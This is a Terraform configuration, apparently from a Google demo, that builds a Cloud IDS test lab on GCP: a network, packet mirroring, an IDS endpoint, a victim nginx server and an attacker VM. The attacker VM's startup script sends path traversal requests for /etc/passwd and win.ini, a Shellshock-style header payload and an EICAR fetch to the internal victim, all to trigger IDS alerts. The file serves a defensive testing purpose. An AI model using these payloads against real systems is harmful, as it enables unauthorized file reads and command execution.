/**
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


## NOTE: This provides PoC demo environment for various use cases ##
##  This is not built for production workload ##



# Create the Cloud IDS Project
resource "google_project" "ids_project" {
  project_id      = "${var.demo_project_id}${var.idstag}${var.random_string}"
  name            = "SF Sol InfraMod-addon-IDS"
  billing_account = var.billing_account
  folder_id = var.folder_id
  }


# Enable the necessary API services
resource "google_project_service" "ids_api_service" {
  for_each = toset([
  "servicenetworking.googleapis.com",
    "ids.googleapis.com",
    "logging.googleapis.com",
    "compute.googleapis.com",
  ])

  service = each.key

  project            = google_project.ids_project.project_id
  disable_on_destroy = true
  disable_dependent_services = true
  
}



# wait delay after enabling APIs
resource "time_sleep" "wait_120_seconds_enable_service_api_ids" {
  depends_on = [google_project_service.ids_api_service]
  create_duration = "120s"
  destroy_duration = "8m"
}


#Create the service Account
resource "google_service_account" "def_ser_acc" {
   project = google_project.ids_project.project_id
   account_id   = "sa-service-account"
   display_name = "IDS Project Service Account"
 }


# Roles needed to setup IDS
resource "google_project_iam_binding" "ids1" {
  project = google_project.ids_project.project_id
  role    = "roles/ids.admin"
  members = [
    var.proxy_access_identities,
    ]
}

# Roles needed to setup IDS
resource "google_project_iam_binding" "ids2" {
  project = google_project.ids_project.project_id
  role    = "roles/ids.viewer"
  members = [
    var.proxy_access_identities,
    ]
}

# Roles needed to setup IDS
resource "google_project_iam_binding" "ids3" {
  project = google_project.ids_project.project_id
  role    = "roles/compute.packetMirroringUser"
  members = [
    var.proxy_access_identities,
    ]
}

# Roles needed to setup IDS
resource "google_project_iam_binding" "ids4" {
  project = google_project.ids_project.project_id
  role    = "roles/logging.viewer"
  members = [
    var.proxy_access_identities,
    ]
}




# Create the IDS network

resource "google_compute_network" "ids_network" {
  project                 = google_project.ids_project.project_id
  name                    = var.vpc_network_name
  auto_create_subnetworks = false
  description             = "IDS network for the Cloud IDS instance and compute instance"
  depends_on = [time_sleep.wait_120_seconds_enable_service_api_ids]
}

# Create IDS Subnetwork
resource "google_compute_subnetwork" "ids_subnetwork" {
  name          = "ids-network-${var.network_region}"
  ip_cidr_range = "192.168.10.0/24"
  region        = var.network_region
  project = google_project.ids_project.project_id
  network       = google_compute_network.ids_network.self_link
# Enabling VPC flow logs
  log_config {
    aggregation_interval = "INTERVAL_10_MIN"
    flow_sampling        = 0.5
    metadata             = "INCLUDE_ALL_METADATA"
  }
  private_ip_google_access   = true 
  depends_on = [
    google_compute_network.ids_network,
  ]
}



# Setup Private IP access
resource "google_compute_global_address" "ids_private_ip" {
  name          = "ids-private-address"
  purpose       = "VPC_PEERING"
  address_type  = "INTERNAL"
  address       = "10.10.10.0"
  prefix_length = 24
  network       = google_compute_network.ids_network.id
  project = google_project.ids_project.project_id
  description = "Cloud IDS IP Range"
  depends_on = [time_sleep.wait_120_seconds_enable_service_api_ids]  
}


# Create Private Connection:
resource "google_service_networking_connection" "private_vpc_connection2" {
  network                 = google_compute_network.ids_network.id
  service                 = "servicenetworking.googleapis.com"
  reserved_peering_ranges = [google_compute_global_address.ids_private_ip.name]
  depends_on = [time_sleep.wait_120_seconds_enable_service_api_ids]
}





#Creating the IDS Endpoint
resource "null_resource" "ids_endpoint" {
  triggers = {
    network = google_compute_network.ids_network.id
  local_vpc_network_name = var.vpc_network_name 
  local_network_zone = var.network_zone
  project = "${data.local_file.proj_id.content}"
    }

  provisioner "local-exec" {
       command     =  "gcloud ids endpoints create cloud-ids-${var.vpc_network_name} --network=${var.vpc_network_name} --zone=${var.network_zone} --severity=INFORMATIONAL --no-async --project ${var.demo_project_id}${var.idstag}${var.random_string}"
  }

  provisioner "local-exec" {
    when        = destroy
    command     = "gcloud ids endpoints delete cloud-ids-${self.triggers.local_vpc_network_name} --zone ${self.triggers.local_network_zone} --project=${self.triggers.project}"
    }
   depends_on = [
    time_sleep.wait_120_seconds_enable_service_api_ids,
    google_compute_network.ids_network,
    google_compute_subnetwork.ids_subnetwork,
    google_compute_global_address.ids_private_ip,
    google_service_networking_connection.private_vpc_connection2,
    ]
   }

# Wait time (19m) for IDS creation
# resource "time_sleep" "wait_for_ids" {
#  depends_on = [null_resource.ids_endpoint]
#  create_duration = "19m"
# }

# Workaround to pass project specific info in IDS packet mirroring policy
# Pushing the project ID in txt file
 resource "null_resource" "proj_id" {
  triggers = {
    network = google_compute_network.ids_network.id
  }
  provisioner "local-exec" {
    command     =  <<EOT
   echo "${var.demo_project_id}${var.idstag}${var.random_string}" >> proj_id-${var.random_string}.txt
    EOT
   working_dir = path.module
}
depends_on = [time_sleep.wait_120_seconds_enable_service_api_ids]
   
}

# Getting the ids endpoint information in a txt file
 resource "null_resource" "forward_rule" {
  triggers = {
    network = google_compute_network.ids_network.id
  }
  provisioner "local-exec" {
    command     =  <<EOT
   gcloud ids endpoints describe cloud-ids-${var.vpc_network_name} --zone=${var.network_zone} --project ${var.demo_project_id}${var.idstag}${var.random_string} --format="value(endpointForwardingRule)" >> f_rule-${var.random_string}.txt
    EOT
   working_dir = path.module
}
depends_on = [null_resource.ids_endpoint]
}


# data file for the forwarding rule
data "local_file" "forward_rule" {
    filename = "ids-module/f_rule-${var.random_string}.txt"
  depends_on = [null_resource.forward_rule]
}


# data file for project id
data "local_file" "proj_id" {
    filename = "ids-module/proj_id-${var.random_string}.txt"
  depends_on = [null_resource.proj_id]
}


# Creating the packet mirroring policy
resource "null_resource" "packet_mirrors" {
 triggers = {
    network = google_compute_network.ids_network.id
    local_region = var.network_region
   project = "${data.local_file.proj_id.content}"
 }
  
  provisioner "local-exec" {
    command     =  <<EOT
    gcloud compute packet-mirrorings create cloud-ids-packet-mirroring --region=${var.network_region} --network=${var.vpc_network_name} --mirrored-subnets=ids-network-${var.network_region} --project=${var.demo_project_id}${var.idstag}${var.random_string} --collector-ilb=${data.local_file.forward_rule.content}
    EOT
    working_dir = path.module
  }
  
   provisioner "local-exec" {
    when        = destroy
  command     = "gcloud compute packet-mirrorings delete cloud-ids-packet-mirroring --region=${self.triggers.local_region} --project=${self.triggers.project}"
 working_dir = path.module
 }
 depends_on = [data.local_file.forward_rule] 
}



# Firewall rule to allow icmp & http
resource "google_compute_firewall" "ids_allow_http_icmp" {
name = "ids-allow-http-icmp"
network = google_compute_network.ids_network.self_link
project = google_project.ids_project.project_id
direction = "INGRESS"
allow {
    protocol = "tcp"
    ports    = ["80"]
    }
 source_ranges = ["0.0.0.0/0"]
target_service_accounts = [
    google_service_account.def_ser_acc.email
  ]
allow {
    protocol = "icmp"
    }
    depends_on = [
        google_compute_network.ids_network
    ]
}


# Enable SSH through IAP
resource "google_compute_firewall" "ids_allow_iap_proxy" {
name = "ids-allow-iap-proxy"
network = google_compute_network.ids_network.self_link
project = google_project.ids_project.project_id
direction = "INGRESS"
allow {
    protocol = "tcp"
    ports    = ["22"]
    }
source_ranges = ["35.235.240.0/20"]
target_service_accounts = [
    google_service_account.def_ser_acc.email
  ]
    depends_on = [
        google_compute_network.ids_network
    ]
}

resource "google_service_account" "compute_service_account" {
  project = google_project.ids_project.project_id
  account_id   = "compute-service-account"
  display_name = "Service Account"
}


# Create Server Instance
resource "google_compute_instance" "ids_victim_server" {
  project = google_project.ids_project.project_id
  name         = "ids-victim-server"
  machine_type = "e2-standard-2"
  zone         = var.network_zone
  shielded_instance_config {
      enable_secure_boot = true
  }
  depends_on = [
    time_sleep.wait_120_seconds_enable_service_api_ids,
    google_compute_router_nat.ids_nats,
    null_resource.packet_mirrors,
    ]

  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-10"
    }
 }

  network_interface {
    network = google_compute_network.ids_network.self_link
    subnetwork = google_compute_subnetwork.ids_subnetwork.self_link
    network_ip= "192.168.10.20"
  }

  service_account {
    # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.
    email  = google_service_account.def_ser_acc.email
    scopes = ["cloud-platform"]
  }
  metadata_startup_script = "apt-get update -y;apt-get install -y nginx;cd /var/www/html/;sudo touch eicar.file"
labels =   {
  asset_type = "prod"
  osshortname = "linux"
}
}



resource "time_sleep" "wait_30_seconds_victim_server" {
  depends_on = [google_compute_instance.ids_victim_server]
  create_duration = "30s"
}


# Create Attacker Instance
resource "google_compute_instance" "ids_attacker_machine" {
  project = google_project.ids_project.project_id
  name         = "ids-attacker-machine"
  machine_type = "e2-standard-2"
  zone         =  var.network_zone
 # network_ip= "172.16.10.10"
  shielded_instance_config {
      enable_secure_boot = true
  }
  depends_on = [
    time_sleep.wait_120_seconds_enable_service_api_ids,
    google_compute_router_nat.ids_nats,
    time_sleep.wait_30_seconds_victim_server,
    null_resource.packet_mirrors,
    ]

  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-10"
    }
 }

  network_interface {
    network = google_compute_network.ids_network.self_link
    subnetwork = google_compute_subnetwork.ids_subnetwork.self_link
    network_ip= "192.168.10.10"
  }

 service_account {
    # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.
    email  = google_service_account.def_ser_acc.email
    scopes = ["cloud-platform"]
  }

   metadata_startup_script = "curl http://192.168.10.20/?item=../../../../WINNT/win.ini;curl http://192.168.10.20/eicar.file;curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd;curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical"
labels =   {
  asset_type = "prod"
  osshortname = "linux"
}
}


# Create a CloudRouter
resource "google_compute_router" "ids_router" {
  project = google_project.ids_project.project_id
  name    = "ids-subnet-router"
  region  = google_compute_subnetwork.ids_subnetwork.region
  network = google_compute_network.ids_network.id

  bgp {
    asn = 64514
  }
}


# Configure a CloudNAT
resource "google_compute_router_nat" "ids_nats" {
  project = google_project.ids_project.project_id
  name                               = "nat-cloud-ids-${var.vpc_network_name}"
  router                             = google_compute_router.ids_router.name
  region                             = google_compute_router.ids_router.region
  nat_ip_allocate_option             = "AUTO_ONLY"
  source_subnetwork_ip_ranges_to_nat = "ALL_SUBNETWORKS_ALL_IP_RANGES"

  log_config {
    enable = true
    filter = "ERRORS_ONLY"
  }
  depends_on = [google_compute_router.ids_router]
}